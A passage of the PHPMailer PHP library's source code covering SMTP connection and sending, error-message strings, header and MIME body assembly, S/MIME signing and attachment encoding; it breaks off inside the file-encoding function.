        foreach (array($this->to, $this->cc, $this->bcc) as $togroup) {
            foreach ($togroup as $to) {
                if (!$this->smtp->recipient($to[0])) {
                    $error = $this->smtp->getError();
                    $bad_rcpt[] = array('to' => $to[0], 'error' => $error['detail']);
                    $isSent = false;
                } else {
                    $isSent = true;
                }
                $this->doCallback($isSent, array($to[0]), array(), array(), $this->Subject, $body, $this->From);
            }
        }

        // Only send the DATA command if we have viable recipients
        if ((count($this->all_recipients) > count($bad_rcpt)) and !$this->smtp->data($header . $body)) {
            throw new phpmailerException($this->lang('data_not_accepted'), self::STOP_CRITICAL);
        }
        if ($this->SMTPKeepAlive) {
            $this->smtp->reset();
        } else {
            $this->smtp->quit();
            $this->smtp->close();
        }
        //Create error message for any bad addresses
        if (count($bad_rcpt) > 0) {
            $errstr = '';
            foreach ($bad_rcpt as $bad) {
                $errstr .= $bad['to'] . ': ' . $bad['error'];
            }
            throw new phpmailerException(
                $this->lang('recipients_failed') . $errstr,
                self::STOP_CONTINUE
            );
        }
        return true;
    }

    /**
     * Initiate a connection to an SMTP server.
     * Returns false if the operation failed.
     * @param array $options An array of options compatible with stream_context_create()
     * @uses SMTP
     * @access public
     * @throws phpmailerException
     * @return boolean
     */
    public function smtpConnect($options = array())
    {
        if (is_null($this->smtp)) {
            $this->smtp = $this->getSMTPInstance();
        }

        // Already connected?
        if ($this->smtp->connected()) {
            return true;
        }

        $this->smtp->setTimeout($this->Timeout);
        $this->smtp->setDebugLevel($this->SMTPDebug);
        $this->smtp->setDebugOutput($this->Debugoutput);
        $this->smtp->setVerp($this->do_verp);
        $hosts = explode(';', $this->Host);
        $lastexception = null;

        foreach ($hosts as $hostentry) {
            $hostinfo = array();
            if (!preg_match('/^((ssl|tls):\/\/)*([a-zA-Z0-9\.-]*):?([0-9]*)$/', trim($hostentry), $hostinfo)) {
                // Not a valid host entry
                continue;
            }
            // $hostinfo[2]: optional ssl or tls prefix
            // $hostinfo[3]: the hostname
            // $hostinfo[4]: optional port number
            // The host string prefix can temporarily override the current setting for SMTPSecure
            // If it's not specified, the default value is used
            $prefix = '';
            $secure = $this->SMTPSecure;
            $tls = ($this->SMTPSecure == 'tls');
            if ('ssl' == $hostinfo[2] or ('' == $hostinfo[2] and 'ssl' == $this->SMTPSecure)) {
                $prefix = 'ssl://';
                $tls = false; // Can't have SSL and TLS at the same time
                $secure = 'ssl';
            } elseif ($hostinfo[2] == 'tls') {
                $tls = true;
                // tls doesn't use a prefix
                $secure = 'tls';
            }
            //Do we need the OpenSSL extension?
            $sslext = defined('OPENSSL_ALGO_SHA1');
            if ('tls' === $secure or 'ssl' === $secure) {
                //Check for an OpenSSL constant rather than using extension_loaded, which is sometimes disabled
                if (!$sslext) {
                    throw new phpmailerException($this->lang('extension_missing').'openssl', self::STOP_CRITICAL);
                }
            }
            $host = $hostinfo[3];
            $port = $this->Port;
            $tport = (integer)$hostinfo[4];
            if ($tport > 0 and $tport < 65536) {
                $port = $tport;
            }
            if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) {
                try {
                    if ($this->Helo) {
                        $hello = $this->Helo;
                    } else {
                        $hello = $this->serverHostname();
                    }
                    $this->smtp->hello($hello);
                    //Automatically enable TLS encryption if:
                    // * it's not disabled
                    // * we have openssl extension
                    // * we are not already using SSL
                    // * the server offers STARTTLS
                    if ($this->SMTPAutoTLS and $sslext and $secure != 'ssl' and $this->smtp->getServerExt('STARTTLS')) {
                        $tls = true;
                    }
                    if ($tls) {
                        if (!$this->smtp->startTLS()) {
                            throw new phpmailerException($this->lang('connect_host'));
                        }
                        // We must resend HELO after tls negotiation
                        $this->smtp->hello($hello);
                    }
                    if ($this->SMTPAuth) {
                        if (!$this->smtp->authenticate(
                            $this->Username,
                            $this->Password,
                            $this->AuthType,
                            $this->Realm,
                            $this->Workstation
                        )
                        ) {
                            throw new phpmailerException($this->lang('authenticate'));
                        }
                    }
                    return true;
                } catch (phpmailerException $exc) {
                    $lastexception = $exc;
                    $this->edebug($exc->getMessage());
                    // We must have connected, but then failed TLS or Auth, so close connection nicely
                    $this->smtp->quit();
                }
            }
        }
        // If we get here, all connection attempts have failed, so close connection hard
        $this->smtp->close();
        // As we've caught all exceptions, just report whatever the last one was
        if ($this->exceptions and !is_null($lastexception)) {
            throw $lastexception;
        }
        return false;
    }

    /**
     * Close the active SMTP session if one exists.
     * @return void
     */
    public function smtpClose()
    {
        if ($this->smtp !== null) {
            if ($this->smtp->connected()) {
                $this->smtp->quit();
                $this->smtp->close();
            }
        }
    }

    /**
     * Set the language for error messages.
     * Returns false if it cannot load the language file.
     * The default language is English.
     * @param string $langcode ISO 639-1 2-character language code (e.g. French is "fr")
     * @param string $lang_path Path to the language file directory, with trailing separator (slash)
     * @return boolean
     * @access public
     */
    public function setLanguage($langcode = 'en', $lang_path = '')
    {
        // Define full set of translatable strings in English
        $PHPMAILER_LANG = array(
            'authenticate' => 'SMTP Error: Could not authenticate.',
            'connect_host' => 'SMTP Error: Could not connect to SMTP host.',
            'data_not_accepted' => 'SMTP Error: data not accepted.',
            'empty_message' => 'Message body empty',
            'encoding' => 'Unknown encoding: ',
            'execute' => 'Could not execute: ',
            'file_access' => 'Could not access file: ',
            'file_open' => 'File Error: Could not open file: ',
            'from_failed' => 'The following From address failed: ',
            'instantiate' => 'Could not instantiate mail function.',
            'invalid_address' => 'Invalid address',
            'mailer_not_supported' => ' mailer is not supported.',
            'provide_address' => 'You must provide at least one recipient email address.',
            'recipients_failed' => 'SMTP Error: The following recipients failed: ',
            'signing' => 'Signing Error: ',
            'smtp_connect_failed' => 'SMTP connect() failed.',
            'smtp_error' => 'SMTP server error: ',
            'variable_set' => 'Cannot set or reset variable: ',
            'extension_missing' => 'Extension missing: '
        );
        if (empty($lang_path)) {
            // Calculate an absolute path so it can work if CWD is not here
            $lang_path = dirname(__FILE__). DIRECTORY_SEPARATOR . 'language'. DIRECTORY_SEPARATOR;
        }
        $foundlang = true;
        $lang_file = $lang_path . 'phpmailer.lang-' . $langcode . '.php';
        // There is no English translation file
        if ($langcode != 'en') {
            // Make sure language file path is readable
            if (!is_readable($lang_file)) {
                $foundlang = false;
            } else {
                // Overwrite language-specific strings.
                // This way we'll never have missing translation keys.
                $foundlang = include $lang_file;
            }
        }
        $this->language = $PHPMAILER_LANG;
        return (boolean)$foundlang; // Returns false if language not found
    }

    /**
     * Get the array of strings for the current language.
     * @return array
     */
    public function getTranslations()
    {
        return $this->language;
    }

    /**
     * Create recipient headers.
     * @access public
     * @param string $type
     * @param array $addr An array of recipient,
     * where each recipient is a 2-element indexed array with element 0 containing an address
     * and element 1 containing a name, like:
     * array(array('joe@example.com', 'Joe User'), array('zoe@example.com', 'Zoe User'))
     * @return string
     */
    public function addrAppend($type, $addr)
    {
        $addresses = array();
        foreach ($addr as $address) {
            $addresses[] = $this->addrFormat($address);
        }
        return $type . ': ' . implode(', ', $addresses) . $this->LE;
    }

    /**
     * Format an address for use in a message header.
     * @access public
     * @param array $addr A 2-element indexed array, element 0 containing an address, element 1 containing a name
     *      like array('joe@example.com', 'Joe User')
     * @return string
     */
    public function addrFormat($addr)
    {
        if (empty($addr[1])) { // No name provided
            return $this->secureHeader($addr[0]);
        } else {
            return $this->encodeHeader($this->secureHeader($addr[1]), 'phrase') . ' <' . $this->secureHeader(
                $addr[0]
            ) . '>';
        }
    }

    /**
     * Word-wrap message.
     * For use with mailers that do not automatically perform wrapping
     * and for quoted-printable encoded messages.
     * Original written by philippe.
     * @param string $message The message to wrap
     * @param integer $length The line length to wrap to
     * @param boolean $qp_mode Whether to run in Quoted-Printable mode
     * @access public
     * @return string
     */
    public function wrapText($message, $length, $qp_mode = false)
    {
        if ($qp_mode) {
            $soft_break = sprintf(' =%s', $this->LE);
        } else {
            $soft_break = $this->LE;
        }
        // If utf-8 encoding is used, we will need to make sure we don't
        // split multibyte characters when we wrap
        $is_utf8 = (strtolower($this->CharSet) == 'utf-8');
        $lelen = strlen($this->LE);
        $crlflen = strlen(self::CRLF);

        $message = $this->fixEOL($message);
        //Remove a trailing line break
        if (substr($message, -$lelen) == $this->LE) {
            $message = substr($message, 0, -$lelen);
        }

        //Split message into lines
        $lines = explode($this->LE, $message);
        //Message will be rebuilt in here
        $message = '';
        foreach ($lines as $line) {
            $words = explode(' ', $line);
            $buf = '';
            $firstword = true;
            foreach ($words as $word) {
                if ($qp_mode and (strlen($word) > $length)) {
                    $space_left = $length - strlen($buf) - $crlflen;
                    if (!$firstword) {
                        if ($space_left > 20) {
                            $len = $space_left;
                            if ($is_utf8) {
                                $len = $this->utf8CharBoundary($word, $len);
                            } elseif (substr($word, $len - 1, 1) == '=') {
                                $len--;
                            } elseif (substr($word, $len - 2, 1) == '=') {
                                $len -= 2;
                            }
                            $part = substr($word, 0, $len);
                            $word = substr($word, $len);
                            $buf .= ' ' . $part;
                            $message .= $buf . sprintf('=%s', self::CRLF);
                        } else {
                            $message .= $buf . $soft_break;
                        }
                        $buf = '';
                    }
                    while (strlen($word) > 0) {
                        if ($length <= 0) {
                            break;
                        }
                        $len = $length;
                        if ($is_utf8) {
                            $len = $this->utf8CharBoundary($word, $len);
                        } elseif (substr($word, $len - 1, 1) == '=') {
                            $len--;
                        } elseif (substr($word, $len - 2, 1) == '=') {
                            $len -= 2;
                        }
                        $part = substr($word, 0, $len);
                        $word = substr($word, $len);

                        if (strlen($word) > 0) {
                            $message .= $part . sprintf('=%s', self::CRLF);
                        } else {
                            $buf = $part;
                        }
                    }
                } else {
                    $buf_o = $buf;
                    if (!$firstword) {
                        $buf .= ' ';
                    }
                    $buf .= $word;

                    if (strlen($buf) > $length and $buf_o != '') {
                        $message .= $buf_o . $soft_break;
                        $buf = $word;
                    }
                }
                $firstword = false;
            }
            $message .= $buf . self::CRLF;
        }

        return $message;
    }

    /**
     * Find the last character boundary prior to $maxLength in a utf-8
     * quoted-printable encoded string.
     * Original written by Colin Brown.
     * @access public
     * @param string $encodedText utf-8 QP text
     * @param integer $maxLength Find the last character boundary prior to this length
     * @return integer
     */
    public function utf8CharBoundary($encodedText, $maxLength)
    {
        $foundSplitPos = false;
        $lookBack = 3;
        while (!$foundSplitPos) {
            $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack);
            $encodedCharPos = strpos($lastChunk, '=');
            if (false !== $encodedCharPos) {
                // Found start of encoded character byte within $lookBack block.
                // Check the encoded byte value (the 2 chars after the '=')
                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
                $dec = hexdec($hex);
                if ($dec < 128) {
                    // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    if ($encodedCharPos > 0) {
                        $maxLength = $maxLength - ($lookBack - $encodedCharPos);
                    }
                    $foundSplitPos = true;
                } elseif ($dec >= 192) {
                    // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength = $maxLength - ($lookBack - $encodedCharPos);
                    $foundSplitPos = true;
                } elseif ($dec < 192) {
                    // Middle byte of a multi byte character, look further back
                    $lookBack += 3;
                }
            } else {
                // No encoded character found
                $foundSplitPos = true;
            }
        }
        return $maxLength;
    }

    /**
     * Apply word wrapping to the message body.
     * Wraps the message body to the number of chars set in the WordWrap property.
     * You should only do this to plain-text bodies as wrapping HTML tags may break them.
     * This is called automatically by createBody(), so you don't need to call it yourself.
     * @access public
     * @return void
     */
    public function setWordWrap()
    {
        if ($this->WordWrap < 1) {
            return;
        }

        switch ($this->message_type) {
            case 'alt':
            case 'alt_inline':
            case 'alt_attach':
            case 'alt_inline_attach':
                $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap);
                break;
            default:
                $this->Body = $this->wrapText($this->Body, $this->WordWrap);
                break;
        }
    }

    /**
     * Assemble message headers.
     * @access public
     * @return string The assembled headers
     */
    public function createHeader()
    {
        $result = '';

        if ($this->MessageDate == '') {
            $this->MessageDate = self::rfcDate();
        }
        $result .= $this->headerLine('Date', $this->MessageDate);


        // To be created automatically by mail()
        if ($this->SingleTo) {
            if ($this->Mailer != 'mail') {
                foreach ($this->to as $toaddr) {
                    $this->SingleToArray[] = $this->addrFormat($toaddr);
                }
            }
        } else {
            if (count($this->to) > 0) {
                if ($this->Mailer != 'mail') {
                    $result .= $this->addrAppend('To', $this->to);
                }
            } elseif (count($this->cc) == 0) {
                $result .= $this->headerLine('To', 'undisclosed-recipients:;');
            }
        }

        $result .= $this->addrAppend('From', array(array(trim($this->From), $this->FromName)));

        // sendmail and mail() extract Cc from the header before sending
        if (count($this->cc) > 0) {
            $result .= $this->addrAppend('Cc', $this->cc);
        }

        // sendmail and mail() extract Bcc from the header before sending
        if ((
                $this->Mailer == 'sendmail' or $this->Mailer == 'qmail' or $this->Mailer == 'mail'
            )
            and count($this->bcc) > 0
        ) {
            $result .= $this->addrAppend('Bcc', $this->bcc);
        }

        if (count($this->ReplyTo) > 0) {
            $result .= $this->addrAppend('Reply-To', $this->ReplyTo);
        }

        // mail() sets the subject itself
        if ($this->Mailer != 'mail') {
            $result .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject)));
        }

        if ($this->MessageID != '') {
            $this->lastMessageID = $this->MessageID;
        } else {
            $this->lastMessageID = sprintf('<%s@%s>', $this->uniqueid, $this->ServerHostname());
        }
        $result .= $this->headerLine('Message-ID', $this->lastMessageID);
        $result .= $this->headerLine('X-Priority', $this->Priority);
        if ($this->XMailer == '') {
            $result .= $this->headerLine(
                'X-Mailer',
                'PHPMailer ' . $this->Version . ' (https://github.com/PHPMailer/PHPMailer/)'
            );
        } else {
            $myXmailer = trim($this->XMailer);
            if ($myXmailer) {
                $result .= $this->headerLine('X-Mailer', $myXmailer);
            }
        }

        if ($this->ConfirmReadingTo != '') {
            $result .= $this->headerLine('Disposition-Notification-To', '<' . trim($this->ConfirmReadingTo) . '>');
        }

        // Add custom headers
        foreach ($this->CustomHeader as $header) {
            $result .= $this->headerLine(
                trim($header[0]),
                $this->encodeHeader(trim($header[1]))
            );
        }
        if (!$this->sign_key_file) {
            $result .= $this->headerLine('MIME-Version', '1.0');
            $result .= $this->getMailMIME();
        }

        return $result;
    }

    /**
     * Get the message MIME type headers.
     * @access public
     * @return string
     */
    public function getMailMIME()
    {
        $result = '';
        $ismultipart = true;
        switch ($this->message_type) {
            case 'inline':
                $result .= $this->headerLine('Content-Type', 'multipart/related;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            case 'attach':
            case 'inline_attach':
            case 'alt_attach':
            case 'alt_inline_attach':
                $result .= $this->headerLine('Content-Type', 'multipart/mixed;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            case 'alt':
            case 'alt_inline':
                $result .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            default:
                // Catches case 'plain': and case '':
                $result .= $this->textLine('Content-Type: ' . $this->ContentType . '; charset=' . $this->CharSet);
                $ismultipart = false;
                break;
        }
        // RFC1341 part 5 says 7bit is assumed if not specified
        if ($this->Encoding != '7bit') {
            // RFC 2045 section 6.4 says multipart MIME parts may only use 7bit, 8bit or binary CTE
            if ($ismultipart) {
                if ($this->Encoding == '8bit') {
                    $result .= $this->headerLine('Content-Transfer-Encoding', '8bit');
                }
                // The only remaining alternatives are quoted-printable and base64, which are both 7bit compatible
            } else {
                $result .= $this->headerLine('Content-Transfer-Encoding', $this->Encoding);
            }
        }

        if ($this->Mailer != 'mail') {
            $result .= $this->LE;
        }

        return $result;
    }

    /**
     * Returns the whole MIME message.
     * Includes complete headers and body.
     * Only valid post preSend().
     * @see PHPMailer::preSend()
     * @access public
     * @return string
     */
    public function getSentMIMEMessage()
    {
        return $this->MIMEHeader . $this->mailHeader . self::CRLF . $this->MIMEBody;
    }

    /**
     * Assemble the message body.
     * Returns an empty string on failure.
     * @access public
     * @throws phpmailerException
     * @return string The assembled message body
     */
    public function createBody()
    {
        $body = '';
        //Create unique IDs and preset boundaries
        $this->uniqueid = md5(uniqid(time()));
        $this->boundary[1] = 'b1_' . $this->uniqueid;
        $this->boundary[2] = 'b2_' . $this->uniqueid;
        $this->boundary[3] = 'b3_' . $this->uniqueid;

        if ($this->sign_key_file) {
            $body .= $this->getMailMIME() . $this->LE;
        }

        $this->setWordWrap();

        $bodyEncoding = $this->Encoding;
        $bodyCharSet = $this->CharSet;
        //Can we do a 7-bit downgrade?
        if ($bodyEncoding == '8bit' and !$this->has8bitChars($this->Body)) {
            $bodyEncoding = '7bit';
            $bodyCharSet = 'us-ascii';
        }
        //If lines are too long, and we're not already using an encoding that will shorten them,
        //change to quoted-printable transfer encoding
        if ('base64' != $this->Encoding and self::hasLineLongerThanMax($this->Body)) {
            $this->Encoding = 'quoted-printable';
            $bodyEncoding = 'quoted-printable';
        }

        $altBodyEncoding = $this->Encoding;
        $altBodyCharSet = $this->CharSet;
        //Can we do a 7-bit downgrade?
        if ($altBodyEncoding == '8bit' and !$this->has8bitChars($this->AltBody)) {
            $altBodyEncoding = '7bit';
            $altBodyCharSet = 'us-ascii';
        }
        //If lines are too long, change to quoted-printable transfer encoding
        if (self::hasLineLongerThanMax($this->AltBody)) {
            $altBodyEncoding = 'quoted-printable';
        }
        //Use this as a preamble in all multipart message types
        $mimepre = "This is a multi-part message in MIME format." . $this->LE . $this->LE;
        switch ($this->message_type) {
            case 'inline':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[1]);
                break;
            case 'attach':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            case 'inline_attach':
                $body .= $mimepre;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            case 'alt':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                if (!empty($this->Ical)) {
                    $body .= $this->getBoundary($this->boundary[1], '', 'text/calendar; method=REQUEST', '');
                    $body .= $this->encodeString($this->Ical, $this->Encoding);
                    $body .= $this->LE . $this->LE;
                }
                $body .= $this->endBoundary($this->boundary[1]);
                break;
            case 'alt_inline':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->endBoundary($this->boundary[1]);
                break;
            case 'alt_attach':
                $body .= $mimepre;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->endBoundary($this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            case 'alt_inline_attach':
                $body .= $mimepre;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->textLine('--' . $this->boundary[2]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[3] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[3], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[3]);
                $body .= $this->LE;
                $body .= $this->endBoundary($this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            default:
                // catch case 'plain' and case ''
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                break;
        }

        if ($this->isError()) {
            $body = '';
        } elseif ($this->sign_key_file) {
            try {
                if (!defined('PKCS7_TEXT')) {
                    throw new phpmailerException($this->lang('extension_missing') . 'openssl');
                }
                // @TODO would be nice to use php://temp streams here, but need to wrap for PHP < 5.1
                $file = tempnam(sys_get_temp_dir(), 'mail');
                if (false === file_put_contents($file, $body)) {
                    throw new phpmailerException($this->lang('signing') . ' Could not write temp file');
                }
                $signed = tempnam(sys_get_temp_dir(), 'signed');
                //Workaround for PHP bug https://bugs.php.net/bug.php?id=69197
                if (empty($this->sign_extracerts_file)) {
                    $sign = @openssl_pkcs7_sign(
                        $file,
                        $signed,
                        'file://' . realpath($this->sign_cert_file),
                        array('file://' . realpath($this->sign_key_file), $this->sign_key_pass),
                        null
                    );
                } else {
                    $sign = @openssl_pkcs7_sign(
                        $file,
                        $signed,
                        'file://' . realpath($this->sign_cert_file),
                        array('file://' . realpath($this->sign_key_file), $this->sign_key_pass),
                        null,
                        PKCS7_DETACHED,
                        $this->sign_extracerts_file
                    );
                }
                if ($sign) {
                    @unlink($file);
                    $body = file_get_contents($signed);
                    @unlink($signed);
                    //The message returned by openssl contains both headers and body, so need to split them up
                    $parts = explode("\n\n", $body, 2);
                    $this->MIMEHeader .= $parts[0] . $this->LE . $this->LE;
                    $body = $parts[1];
                } else {
                    @unlink($file);
                    @unlink($signed);
                    throw new phpmailerException($this->lang('signing') . openssl_error_string());
                }
            } catch (phpmailerException $exc) {
                $body = '';
                if ($this->exceptions) {
                    throw $exc;
                }
            }
        }
        return $body;
    }

    /**
     * Return the start of a message boundary.
     * @access protected
     * @param string $boundary
     * @param string $charSet
     * @param string $contentType
     * @param string $encoding
     * @return string
     */
    protected function getBoundary($boundary, $charSet, $contentType, $encoding)
    {
        $result = '';
        if ($charSet == '') {
            $charSet = $this->CharSet;
        }
        if ($contentType == '') {
            $contentType = $this->ContentType;
        }
        if ($encoding == '') {
            $encoding = $this->Encoding;
        }
        $result .= $this->textLine('--' . $boundary);
        $result .= sprintf('Content-Type: %s; charset=%s', $contentType, $charSet);
        $result .= $this->LE;
        // RFC1341 part 5 says 7bit is assumed if not specified
        if ($encoding != '7bit') {
            $result .= $this->headerLine('Content-Transfer-Encoding', $encoding);
        }
        $result .= $this->LE;

        return $result;
    }

    /**
     * Return the end of a message boundary.
     * @access protected
     * @param string $boundary
     * @return string
     */
    protected function endBoundary($boundary)
    {
        return $this->LE . '--' . $boundary . '--' . $this->LE;
    }

    /**
     * Set the message type.
     * PHPMailer only supports some preset message types,
     * not arbitrary MIME structures.
     * @access protected
     * @return void
     */
    protected function setMessageType()
    {
        $type = array();
        if ($this->alternativeExists()) {
            $type[] = 'alt';
        }
        if ($this->inlineImageExists()) {
            $type[] = 'inline';
        }
        if ($this->attachmentExists()) {
            $type[] = 'attach';
        }
        $this->message_type = implode('_', $type);
        if ($this->message_type == '') {
            $this->message_type = 'plain';
        }
    }

    /**
     * Format a header line.
     * @access public
     * @param string $name
     * @param string $value
     * @return string
     */
    public function headerLine($name, $value)
    {
        return $name . ': ' . $value . $this->LE;
    }

    /**
     * Return a formatted mail line.
     * @access public
     * @param string $value
     * @return string
     */
    public function textLine($value)
    {
        return $value . $this->LE;
    }

    /**
     * Add an attachment from a path on the filesystem.
     * Returns false if the file could not be found or read.
     * @param string $path Path to the attachment.
     * @param string $name Overrides the attachment name.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File extension (MIME) type.
     * @param string $disposition Disposition to use
     * @throws phpmailerException
     * @return boolean
     */
    public function addAttachment($path, $name = '', $encoding = 'base64', $type = '', $disposition = 'attachment')
    {
        try {
            if (!@is_file($path)) {
                throw new phpmailerException($this->lang('file_access') . $path, self::STOP_CONTINUE);
            }

            // If a MIME type is not specified, try to work it out from the file name
            if ($type == '') {
                $type = self::filenameToType($path);
            }

            $filename = basename($path);
            if ($name == '') {
                $name = $filename;
            }

            $this->attachment[] = array(
                0 => $path,
                1 => $filename,
                2 => $name,
                3 => $encoding,
                4 => $type,
                5 => false, // isStringAttachment
                6 => $disposition,
                7 => 0
            );

        } catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            $this->edebug($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
        return true;
    }

    /**
     * Return the array of attachments.
     * @return array
     */
    public function getAttachments()
    {
        return $this->attachment;
    }

    /**
     * Attach all file, string, and binary attachments to the message.
     * Returns an empty string on failure.
     * @access protected
     * @param string $disposition_type
     * @param string $boundary
     * @return string
     */
    protected function attachAll($disposition_type, $boundary)
    {
        // Return text of body
        $mime = array();
        $cidUniq = array();
        $incl = array();

        // Add all attachments
        foreach ($this->attachment as $attachment) {
            // Check if it is a valid disposition_filter
            if ($attachment[6] == $disposition_type) {
                // Check for string attachment
                $string = '';
                $path = '';
                $bString = $attachment[5];
                if ($bString) {
                    $string = $attachment[0];
                } else {
                    $path = $attachment[0];
                }

                $inclhash = md5(serialize($attachment));
                if (in_array($inclhash, $incl)) {
                    continue;
                }
                $incl[] = $inclhash;
                $name = $attachment[2];
                $encoding = $attachment[3];
                $type = $attachment[4];
                $disposition = $attachment[6];
                $cid = $attachment[7];
                if ($disposition == 'inline' && isset($cidUniq[$cid])) {
                    continue;
                }
                $cidUniq[$cid] = true;

                $mime[] = sprintf('--%s%s', $boundary, $this->LE);
                $mime[] = sprintf(
                    'Content-Type: %s; name="%s"%s',
                    $type,
                    $this->encodeHeader($this->secureHeader($name)),
                    $this->LE
                );
                // RFC1341 part 5 says 7bit is assumed if not specified
                if ($encoding != '7bit') {
                    $mime[] = sprintf('Content-Transfer-Encoding: %s%s', $encoding, $this->LE);
                }

                if ($disposition == 'inline') {
                    $mime[] = sprintf('Content-ID: <%s>%s', $cid, $this->LE);
                }

                // If a filename contains any of these chars, it should be quoted,
                // but not otherwise: RFC2183 & RFC2045 5.1
                // Fixes a warning in IETF's msglint MIME checker
                // Allow for bypassing the Content-Disposition header totally
                if (!(empty($disposition))) {
                    $encoded_name = $this->encodeHeader($this->secureHeader($name));
                    if (preg_match('/[ \(\)<>@,;:\\"\/\[\]\?=]/', $encoded_name)) {
                        $mime[] = sprintf(
                            'Content-Disposition: %s; filename="%s"%s',
                            $disposition,
                            $encoded_name,
                            $this->LE . $this->LE
                        );
                    } else {
                        $mime[] = sprintf(
                            'Content-Disposition: %s; filename=%s%s',
                            $disposition,
                            $encoded_name,
                            $this->LE . $this->LE
                        );
                    }
                } else {
                    $mime[] = $this->LE;
                }

                // Encode as string attachment
                if ($bString) {
                    $mime[] = $this->encodeString($string, $encoding);
                    if ($this->isError()) {
                        return '';
                    }
                    $mime[] = $this->LE . $this->LE;
                } else {
                    $mime[] = $this->encodeFile($path, $encoding);
                    if ($this->isError()) {
                        return '';
                    }
                    $mime[] = $this->LE . $this->LE;
                }
            }
        }

        $mime[] = sprintf('--%s--%s', $boundary, $this->LE);

        return implode('', $mime);
    }

    /**
     * Encode a file attachment in requested format.
     * Returns an empty string on failure.
     * @param string $path The full path to the file
     * @param string $encoding The encoding to use; one of 'base64', '7bit', '8bit', 'binary', 'quoted-printable'
     * @throws phpmailerException
     * @see EncodeFile(encodeFile
     * @access protected
     * @return string
     */
    protected function encodeFile($path, $encoding = 'base64')
    {
        try {
            if (!is_readable($path)) {
                throw new phpmailerException($this->lang('file_open') . $path, self::STOP_CONTINUE);
            }
            $magic_quotes = get_magic_quotes_runtime();
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
                    set_magic_quotes_runtime(false);
                } else {
                    //Doesn't exist in PHP 5.4, but we don't need to check because
                    //get_magic_quotes_runtime always returns false in 5.4+
                    //so it will never get here
                    ini_set('magic_quotes_runtime', false);
                }
            }
            $file_buffer = file_get_contents($path);
